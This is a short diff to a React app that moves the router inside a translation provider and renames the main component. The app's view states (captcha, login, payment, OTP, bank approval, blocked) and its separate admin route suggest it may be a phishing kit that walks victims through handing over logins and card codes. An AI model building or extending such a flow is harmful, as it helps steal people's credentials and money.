@@ -14,7 +14,7 @@ import { TranslationProvider, useTranslation } from './TranslationContext';
 
 export type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked';
 
-const MainApp: React.FC = () => {
+const MainAppContent: React.FC = () => {
   const { t } = useTranslation();
   const navigate = useNavigate();
   const location = useLocation();
@@ -323,12 +323,14 @@ const MainApp: React.FC = () => {
 
 const App: React.FC = () => {
   return (
-    <BrowserRouter>
-      <Routes>
-        <Route path="/" element={<MainApp />} />
-        <Route path="/admin" element={<AdminPanel onBack={() => window.location.href = '/'} />} />
-      </Routes>
-    </BrowserRouter>
+    <TranslationProvider>
+      <BrowserRouter>
+        <Routes>
+          <Route path="/" element={<MainAppContent />} />
+          <Route path="/admin" element={<AdminPanel onBack={() => window.location.href = '/'} />} />
+        </Routes>
+      </BrowserRouter>
+    </TranslationProvider>
   );
 };
 
